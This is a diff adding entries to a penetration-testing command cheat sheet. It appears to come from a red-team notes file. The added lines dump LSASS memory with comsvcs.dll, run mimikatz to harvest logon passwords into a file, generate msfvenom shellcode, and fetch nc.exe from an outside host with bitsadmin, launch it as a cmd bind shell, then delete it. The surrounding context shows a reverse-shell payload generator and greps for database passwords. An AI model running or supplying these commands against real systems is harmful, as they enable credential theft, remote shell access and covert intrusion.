@@ -100,6 +100,8 @@ msiexec /quiet /qn /i C:\evil.msi
 #reverse-shell x64 windows
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.45 LPORT=8888 -f c -b \x00\x0a\x0d
 
+#messagebox
+msfvenom -p windows/x64/messagebox TEXT=CoreThreat TITLE=PWN -f raw -o SHELLCODE_MESSAGE_BOX.bin
 
 ```
 
@@ -140,12 +142,24 @@ find / -perm -777 -type f 2>/dev/null
     grep -rnw '/' -ie 'DB_PASSWORD' --color=always
     grep -rnw '/' -ie 'DB_USER' --color=always
 
+#lsass minidump com
+"rundll32 C:\windows\system32\comsvcs.dll MiniDump "1234 dump.bin full""
+rundll32.exe  comsvcs.dll,#24 600 C:\Users\user\Desktop\lsass.dmp full
+
+# mimikatz param
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\tmp\mimikatz_output.txt
+```
+
+FILETRANSFER
+```bash
 #File Upload on linux systems via base64 encoding
 #Converting a file to base64:
 cat file2upload | base64
 
 #Once the file is converted to base64, you can just create a new file on the remote system and copy the base64 output of the above file into it. Next step would be to reverse the base64 to binary
 cat fileWithBase64Content | base64 -d > finalBinary
+
+bitsadmin /transfer evil.exe /download /priority high https://wslab.de/tools/nc.exe %temp%\evil.exe & start /wait %temp%\evil.exe -l -p 3333 -e cmd & del %temp%\evil.exe
 
 ```
 
